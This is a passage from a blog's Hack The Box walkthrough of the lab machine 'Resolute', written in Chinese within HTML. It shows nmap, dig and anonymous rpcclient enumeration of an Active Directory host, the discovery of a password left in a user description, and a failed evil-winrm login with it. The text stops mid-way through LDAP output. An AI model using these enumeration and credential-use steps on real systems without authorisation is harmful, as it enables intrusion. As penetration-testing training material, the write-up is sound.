

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="World&#39;sEnd">
  <meta name="keywords" content="">
  
    <meta name="description" content="Don’t let your future self hate your present self. 不要让未来的你，讨厌现在的自己。 Hack The Box - Resolute12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB Walkthrough - Resolute">
<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Resolute.html">
<meta property="og:site_name" content="Network Security Notes">
<meta property="og:description" content="Don’t let your future self hate your present self. 不要让未来的你，讨厌现在的自己。 Hack The Box - Resolute12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423202545223.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423205651911.png">
<meta property="article:published_time" content="2023-08-13T22:39:09.031Z">
<meta property="article:modified_time" content="2023-08-13T20:05:39.410Z">
<meta property="article:author" content="World&#39;sEnd">
<meta property="article:tag" content="Active Directory">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423202545223.png">
  
  
  
  <title>HTB Walkthrough - Resolute - Network Security Notes</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB Walkthrough - Resolute"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-14 06:39" pubdate>
          August 14, 2023 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          32k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          267 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB Walkthrough - Resolute</h1>
            
            
              <div class="markdown-body">
                
                <p>Don’t let your future self hate your present self.</p>
<p>不要让未来的你，讨厌现在的自己。</p>
<h4 id="Hack-The-Box-Resolute"><a href="#Hack-The-Box-Resolute" class="headerlink" title="Hack The Box - Resolute"></a>Hack The Box - Resolute</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.92 scan initiated Sat Apr 23 17:10:45 2022 as: nmap -sC -sV -T4 -Pn -p- -oA nmap.txt 10.10.10.169</span><br><span class="line">Nmap scan report for 10.10.10.169</span><br><span class="line">Host is up (0.48s latency).</span><br><span class="line">Not shown: 65512 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-23 09:32:06Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49674/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49675/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49680/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49712/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">50105/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h26m59s, deviation: 4h02m30s, median: 6m59s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-04-23T09:33:06</span><br><span class="line">|_  start_date: 2022-04-23T09:16:10</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3.1.1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: Resolute</span><br><span class="line">|   NetBIOS computer name: RESOLUTE\x00</span><br><span class="line">|   Domain name: megabank.local</span><br><span class="line">|   Forest name: megabank.local</span><br><span class="line">|   FQDN: Resolute.megabank.local</span><br><span class="line">|_  System time: 2022-04-23T02:33:02-07:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sat Apr 23 17:26:25 2022 -- 1 IP address (1 host up) scanned in 940.01 seconds</span><br></pre></td></tr></table></figure>

<h5 id="DNS协议："><a href="#DNS协议：" class="headerlink" title="DNS协议："></a>DNS协议：</h5><p>Nmap为我枚举出了megabank.local，但是按惯例来讲目标应该还存有resolute.local，我可以试试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ dig @10.10.10.169 megabank.local       </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; @10.10.10.169 megabank.local</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; WARNING: .local is reserved for Multicast DNS</span><br><span class="line">;; You are currently testing what happens when an mDNS query is leaked to DNS</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 20763</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;megabank.local.                        IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">megabank.local.         600     IN      A       10.10.10.169</span><br><span class="line"></span><br><span class="line">;; Query time: 187 msec</span><br><span class="line">;; SERVER: 10.10.10.169#53(10.10.10.169) (UDP)</span><br><span class="line">;; WHEN: Sat Apr 23 17:31:30 CST 2022</span><br><span class="line">;; MSG SIZE  rcvd: 59</span><br></pre></td></tr></table></figure>

<p>但是我错了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ dig @10.10.10.169 resolute.local</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; @10.10.10.169 resolute.local</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; connection timed out; no servers could be reached</span><br></pre></td></tr></table></figure>

<p>他并没有该域，看来这次或许会反常一点。我还是会尝试区域传输，尽管它从来没成功过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ dig axfr @10.10.10.169 megabank.local  </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.169 megabank.local</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure>

<h5 id="RCP端口："><a href="#RCP端口：" class="headerlink" title="RCP端口："></a>RCP端口：</h5><p>RPC端口即使现在我依然觉得它很神秘，哪怕现在我也只知道它能用来做哪些，但我还是无法预估它具体能用来做哪些，做多少。我可以尝试匿名链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ rpcclient -U &quot;&quot; -N 10.10.10.169</span><br><span class="line">rpcclient $&gt; </span><br></pre></td></tr></table></figure>

<p>看起来它允许我匿名访问，那么我可以尝试枚举目标一些信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[ryan] rid:[0x451]</span><br><span class="line">user:[marko] rid:[0x457]</span><br><span class="line">user:[sunita] rid:[0x19c9]</span><br><span class="line">user:[abigail] rid:[0x19ca]</span><br><span class="line">user:[marcus] rid:[0x19cb]</span><br><span class="line">user:[sally] rid:[0x19cc]</span><br><span class="line">user:[fred] rid:[0x19cd]</span><br><span class="line">user:[angela] rid:[0x19ce]</span><br><span class="line">user:[felicia] rid:[0x19cf]</span><br><span class="line">user:[gustavo] rid:[0x19d0]</span><br><span class="line">user:[ulf] rid:[0x19d1]</span><br><span class="line">user:[stevie] rid:[0x19d2]</span><br><span class="line">user:[claire] rid:[0x19d3]</span><br><span class="line">user:[paulo] rid:[0x19d4]</span><br><span class="line">user:[steve] rid:[0x19d5]</span><br><span class="line">user:[annette] rid:[0x19d6]</span><br><span class="line">user:[annika] rid:[0x19d7]</span><br><span class="line">user:[per] rid:[0x19d8]</span><br><span class="line">user:[claude] rid:[0x19d9]</span><br><span class="line">user:[melanie] rid:[0x2775]</span><br><span class="line">user:[zach] rid:[0x2776]</span><br><span class="line">user:[simon] rid:[0x2777]</span><br><span class="line">user:[naoki] rid:[0x2778]</span><br></pre></td></tr></table></figure>

<p>就这样我获取到了一些用户名，可以用来去枚举kerberos协议用户名，但是如果我想知道用户更多的信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; querydispinfo</span><br><span class="line">index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain</span><br><span class="line">index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.</span><br><span class="line">index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain</span><br><span class="line">index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account</span><br><span class="line">index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!</span><br><span class="line">index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)</span><br><span class="line">index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)</span><br><span class="line">rpcclient $&gt; </span><br></pre></td></tr></table></figure>

<p>为了阅读方便，我把重要的信息截了出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!</span><br></pre></td></tr></table></figure>

<p>我尝试登录目标，不可以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.10.169 -u marco -p &#x27;Welcome123!&#x27;                           </span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.3</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                   </span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError</span><br><span class="line"></span><br><span class="line">Error: Exiting with code 1</span><br></pre></td></tr></table></figure>

<h5 id="LDAP端口："><a href="#LDAP端口：" class="headerlink" title="LDAP端口："></a>LDAP端口：</h5><p>ldapsearch这工具虽然我还是不会用，但是我找到了个替补选项，Nmap有一些默认的LDAP脚本，LDAP查询返回的垃圾信息也很多，我只放部分与目标相关的，以满足下对LDAP的好奇心：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -sT -Pn -n --open 10.10.10.169 -p389 --script ldap-rootdse</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-23 17:56 CST</span><br><span class="line">Nmap scan report for 10.10.10.169</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">389/tcp open  ldap</span><br><span class="line">| ldap-rootdse: </span><br><span class="line">| LDAP Results</span><br><span class="line">|   &lt;ROOT&gt;</span><br><span class="line">|       currentTime: 20220423100354.0Z</span><br><span class="line">|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=megabank,DC=local</span><br><span class="line">|       dsServiceName: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local</span><br><span class="line">|       namingContexts: DC=megabank,DC=local</span><br><span class="line">|       namingContexts: CN=Configuration,DC=megabank,DC=local</span><br><span class="line">|       namingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local</span><br><span class="line">|       namingContexts: DC=DomainDnsZones,DC=megabank,DC=local</span><br><span class="line">|       namingContexts: DC=ForestDnsZones,DC=megabank,DC=local</span><br><span class="line">|       defaultNamingContext: DC=megabank,DC=local</span><br><span class="line">|       schemaNamingContext: CN=Schema,CN=Configuration,DC=megabank,DC=local</span><br><span class="line">|       configurationNamingContext: CN=Configuration,DC=megabank,DC=local</span><br><span class="line">|       rootDomainNamingContext: DC=megabank,DC=local</span><br><span class="line">......</span><br><span class="line">|       supportedLDAPVersion: 3</span><br><span class="line">|       supportedLDAPVersion: 2</span><br><span class="line">|       supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">|       supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">|       supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">|       supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">|       supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">|       supportedLDAPPolicies: MaxConnections</span><br><span class="line">|       supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">|       supportedLDAPPolicies: MaxPageSize</span><br><span class="line">|       supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">|       supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">|       supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">|       supportedLDAPPolicies: MaxTempTableSize</span><br><span class="line">|       supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">|       supportedLDAPPolicies: MinResultSets</span><br><span class="line">|       supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">|       supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">|       supportedLDAPPolicies: MaxValRange</span><br><span class="line">|       supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">|       supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">|       supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">|       highestCommittedUSN: 151908</span><br><span class="line">|       supportedSASLMechanisms: GSSAPI</span><br><span class="line">|       supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">|       supportedSASLMechanisms: EXTERNAL</span><br><span class="line">|       supportedSASLMechanisms: 